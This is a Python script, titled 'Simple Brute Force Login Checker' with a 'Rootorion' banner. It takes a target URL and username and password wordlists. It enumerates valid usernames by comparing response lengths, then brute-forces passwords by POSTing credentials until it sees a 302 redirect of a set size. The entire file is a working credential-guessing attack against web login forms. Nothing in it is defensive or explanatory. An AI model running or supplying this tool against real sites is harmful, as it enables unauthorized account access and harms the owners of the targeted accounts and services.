import requests

# ===== Banner =====
def show_banner():
    print(r""" 
  ____             _             _             
 |  _ \ ___   ___ | |_ ___  _ __(_) ___  _ __  
 | |_) / _ \ / _ \| __/ _ \| '__| |/ _ \| '_ \ 
 |  _ < (_) | (_) | || (_) | |  | | (_) | | | |
 |_| \_\___/ \___/ \__\___/|_|  |_|\___/|_| |_|  

      Simple Brute Force Login Checker
    """)

# ===== Main Program =====
def main():
    show_banner()

    URL = input("Url target: ").strip()
    USERNAME = input("Path file username.txt: ").strip()
    PASSWORD = input("Path file password.txt: ").strip()

    HEADERS = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    def check_username(username):
        data = {
            "username": username,
            "password": "password"
        }

        try:
            response = requests.post(URL, headers=HEADERS, data=data)
            if len(response.text) > 2986:
                print(f"[v] USERNAME VALID: {username}")
                return True
            else:
                print(f"[x] USERNAME NOT VALID: {username}")
                return False
        except Exception as e:
            print(f"[!] Error checking username: {e}")
            return False

    def try_check_password(username, password):
        data = {
            "username": username,
            "password": password
        }

        try:
            response = requests.post(URL, headers=HEADERS, data=data, allow_redirects=False)
            if response.status_code == 302 and len(response.text) == 170:
                print(f"[v] LOGIN SUCCESS: {username} : {password}")
                return True
            else:
                print(f"[x] LOGIN FAILED: {username} : {password}")
                return False
        except Exception as e:
            print(f"[!] Error checking password: {e}")
            return False

    valid_data = []

    try:
        with open(USERNAME, 'r') as file:
            for user in file:
                user = user.strip()
                if check_username(user):
                    valid_data.append(user)
    except FileNotFoundError:
        print(f"[!] File username '{USERNAME}' not found")
        return

    try:
        for valid_user in valid_data:
            with open(PASSWORD, 'r') as file:
                for pw in file:
                    pw = pw.strip()
                    if try_check_password(valid_user, pw):
                        break
    except FileNotFoundError:
        print(f"[!] File password '{PASSWORD}' not found")
        return

# Run
if __name__ == "__main__":
    main()
